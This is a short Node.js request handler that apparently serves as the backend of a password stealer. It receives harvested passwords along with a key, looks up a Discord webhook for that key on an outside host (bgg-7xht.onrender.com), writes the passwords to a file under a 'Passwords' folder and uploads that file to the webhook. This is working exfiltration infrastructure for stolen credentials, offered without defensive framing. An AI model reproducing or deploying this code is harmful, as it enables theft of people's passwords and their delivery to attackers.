const fs = require('fs').promises;
const { WebhookClient } = require('discord.js');
const crypto = require('crypto');
const axios = require('axios');



module.exports = async (req, res) => {
    const { key, passwords } = req.body;

    if (!key) {
        return res.sendStatus(400); 
    }
		const response = await axios.get('https://bgg-7xht.onrender.com/keysorgu?key=${key}&api_auth=1295');
  const webhook = response.data;

    if (!webhook) {
        return res.sendStatus(400); 
    }

    const randomstringg = crypto.randomBytes(5).toString('hex');
    const content = passwords;

    try {
        await fs.writeFile(`./Vct/Passwords/${randomstringg}.txt`, content);


        const webhookClient = new WebhookClient({ url: webhook });
        await webhookClient.send({
            files: [{
                attachment: `./Vct/Passwords/${randomstringg}.txt`,
                name: `${randomstringg}password.txt`
            }]
        });


        return res.sendStatus(200);
    } catch (err) {
      
      console.error(err);

        return res.status(500).json({ error: 'Internal Server Error' });
    }
};
